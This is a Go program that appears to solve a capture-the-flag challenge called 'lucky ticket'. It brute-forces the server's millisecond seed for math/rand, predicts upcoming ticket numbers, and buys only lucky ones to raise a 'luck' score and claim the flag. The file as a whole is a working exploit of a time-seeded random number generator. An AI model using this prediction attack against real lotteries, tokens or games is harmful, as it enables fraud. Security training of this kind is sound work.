package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strconv"
	"time"
)

const serverURL = "https://t-luckyticket-w8mg6qr0.spbctf.ru"

type UserDTO struct {
	Username string `json:"username"`
	Balance  uint   `json:"balance"`
	Luck     uint   `json:"luck"`
}

type TicketDTO struct {
	ID     uint   `json:"id"`
	Number string `json:"number"`
	Status string `json:"status"`
}

type luckTicketDTO struct {
	Luck   uint   `json:"luck"`
	Ticket string `json:"ticket"`
}

type interviewDTO struct {
	Flag string `json:"flag,omitempty"`
}

func isTicketLucky(number string) bool {
	if len(number) != 6 {
		return false
	}

	firstSum, secondSum := 0, 0
	for i := 0; i < 3; i++ {
		digit, err := strconv.Atoi(string(number[i]))
		if err != nil {
			return false
		}
		firstSum += digit

		digit, err = strconv.Atoi(string(number[i+3]))
		if err != nil {
			return false
		}
		secondSum += digit
	}

	return firstSum == secondSum
}

func GenerateTicketNumber(seed int64) string {
	source := rand.NewSource(seed)
	random := rand.New(source)

	return fmt.Sprintf("%06d", random.Intn(1000000))
}

func login(username, password string) (*http.Client, error) {
	jar, _ := cookiejar.New(nil)

	client := &http.Client{
		Jar: jar,
	}

	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)

	resp, err := client.PostForm(serverURL+"/api/auth/login", data)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("login: invalid status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	fmt.Println("login response:", string(body))

	return client, nil
}

func getUserInfo(client *http.Client) (*UserDTO, error) {
	return request[UserDTO](client, "GET", serverURL+"/api/user/me", nil)
}

func buyTicket(client *http.Client) (*TicketDTO, error) {
	return request[TicketDTO](client, "POST", serverURL+"/api/ticket/buy", nil)
}

func eatTicket(client *http.Client, ticket TicketDTO) (*luckTicketDTO, error) {
	bs, _ := json.Marshal(ticket)
	body := bytes.NewReader(bs)
	return request[luckTicketDTO](client, "POST", serverURL+"/api/ticket/eat", body)
}

func interview(client *http.Client) (*interviewDTO, error) {
	return request[interviewDTO](client, "POST", serverURL+"/api/interview", nil)
}

func request[Resp any](client *http.Client, method, url string, body io.Reader) (*Resp, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}

	req.Header.Add("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("request: invalid status: %v", resp.Status)
	}

	bodyResp, _ := io.ReadAll(resp.Body)

	var data Resp
	err = json.Unmarshal(bodyResp, &data)
	if err != nil {
		return nil, err
	}

	return &data, nil
}

func getDeltaTime(client *http.Client) (int64, error) {
	ticketsCount := 20
	tickets := make(map[string]int64, ticketsCount)

	for range ticketsCount {
		seed := time.Now().UnixNano() / int64(time.Millisecond)
		_ = GenerateTicketNumber(seed)

		ticket, err := buyTicket(client)
		if err != nil {
			return 0, err
		}

		tickets[ticket.Number] = seed
	}

	dtList := make([]int64, 0, ticketsCount)

	seedNow := time.Now().UnixNano() / int64(time.Millisecond)
	deltaSeed := int64(100 * time.Second / time.Millisecond)
	for seed := seedNow - deltaSeed; seed < seedNow+deltaSeed; seed++ {
		ticket := GenerateTicketNumber(seed)
		seedServer, ok := tickets[ticket]
		if !ok {
			continue
		}

		dtList = append(dtList, seed-seedServer)
		fmt.Printf("ticket=%v seedServer=%v seed=%v deltaSeed=%v\n", ticket, seedServer, seed, seed-seedServer)
	}

	dt := dtList[len(dtList)/2]

	return dt, nil
}

func luckyTicketTask() error {
	username := "user_demo_673010487"
	password := "user_demo_673010487"

	client, err := login(username, password)
	if err != nil {
		return err
	}

	userInfo, err := getUserInfo(client)
	if err != nil {
		return err
	}
	fmt.Printf("userInfo: %+v\n", userInfo)

	deltaTime, err := getDeltaTime(client)
	if err != nil {
		return err
	}
	fmt.Printf("deltaTime: %v\n", deltaTime)

	for {
		seed := time.Now().UnixNano()/int64(time.Millisecond) + deltaTime
		ticketExpected := GenerateTicketNumber(seed)
		if !isTicketLucky(ticketExpected) {
			time.Sleep(time.Millisecond / 10)
			continue
		}

		ticket, err := buyTicket(client)
		if err != nil {
			return err
		}
		fmt.Printf("ticket: %+v\n", ticket)

		if isTicketLucky(ticket.Number) {
			luckTicket, err := eatTicket(client, *ticket)
			if err != nil {
				return err
			}

			fmt.Printf("luckTicket: %+v\n", luckTicket)
		}

		userInfo, err := getUserInfo(client)
		if err != nil {
			return err
		}

		if userInfo.Luck == 100 {
			break
		}
	}

	userInfo, err = getUserInfo(client)
	if err != nil {
		return err
	}
	fmt.Printf("userInfo: %+v\n", userInfo)

	flag, err := interview(client)
	if err != nil {
		return err
	}

	fmt.Printf("flag: %v", flag)

	return nil
}

func main() {
	err := luckyTicketTask()
	if err != nil {
		fmt.Println("ERROR:", err)
	}
}
